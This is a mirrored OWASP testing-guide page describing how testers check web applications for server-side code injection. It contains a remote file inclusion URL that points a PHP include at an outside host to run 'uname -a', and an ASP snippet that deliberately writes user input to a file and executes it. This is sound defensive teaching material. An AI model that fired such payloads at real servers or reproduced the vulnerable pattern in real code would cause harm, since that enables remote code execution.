---
title: "Code Injection (OWASP WSTG)"
category: "web"
subcategory: "injection"
type: "technique"
tags: ["wstg", "web", "code", "injection", "code-injection", "web-application-security-testing", "application", "security"]
summary: "This section describes how a tester can check if it is possible to enter code as input on a web page and have it executed by the web server."
source:
  name: "OWASP WSTG"
  url: "https://github.com/OWASP/wstg/blob/ea174034f91439a17a1595e57d51e5b461820273/document/4-Web_Application_Security_Testing/07-Injection/11-Code_Injection.md"
license: "CC BY-SA 4.0"
difficulty: "medium"
when_to_use: ["Test Objectives", "How to Test"]
---

# Code Injection

|ID          |
|------------|
|WSTG-INJT-11|

## Summary

This section describes how a tester can check if it is possible to enter code as input on a web page and have it executed by the web server.

In [Code Injection](https://owasp.org/www-community/attacks/Code_Injection) testing, a tester submits input that is processed by the web server as dynamic code or as an included file. These tests can target various server-side scripting engines, e.g., ASP or PHP. Proper input validation and secure coding practices need to be employed to protect against these attacks.

## Test Objectives

- Identify injection points where you can inject code into the application.
- Assess the injection severity.

## How to Test

### Black-Box Testing

#### PHP Injection Vulnerabilities

Using the querystring, the tester can inject code (in this example, a malicious URL) to be processed as part of the included file:

`https://www.example.com/uptime.php?pin=https://www.example2.com/packx1/cs.jpg?&cmd=uname%20-a`

> The malicious URL is accepted as a parameter for the PHP page, which will later use the value in an included file.

### Gray-Box Testing

#### ASP Code Injection Vulnerabilities

Examine ASP code for user input used in execution functions. Can the user enter commands into the Data input field? Here, the ASP code will save the input to a file and then execute it:
```asp
<%
If not isEmpty(Request( "Data" ) ) Then
Dim fso, f
'User input Data is written to a file named data.txt
Set fso = CreateObject("Scripting.FileSystemObject")
Set f = fso.OpenTextFile(Server.MapPath( "data.txt" ), 8, True)
f.Write Request("Data") & vbCrLf
f.close
Set f = nothing
Set fso = Nothing

'Data.txt is executed
Server.Execute( "data.txt" )

Else
%>

<form>
<input name="Data" /><input type="submit" name="Enter Data" />

</form>
<%
End If
%>)))
```

### References

- [Insecure.org](https://insecure.org/)
- [Wikipedia](https://www.wikipedia.org)
- [OWASP Community - Code Injection](https://community.owasp.org/attacks/Code_Injection)

---

## Source

OWASP WSTG - <https://github.com/OWASP/wstg/blob/ea174034f91439a17a1595e57d51e5b461820273/document/4-Web_Application_Security_Testing/07-Injection/11-Code_Injection.md>

Mirrored into CTF-Brain at commit `ea174034f914`. Licence: CC BY-SA 4.0. The text is the original authors' work.
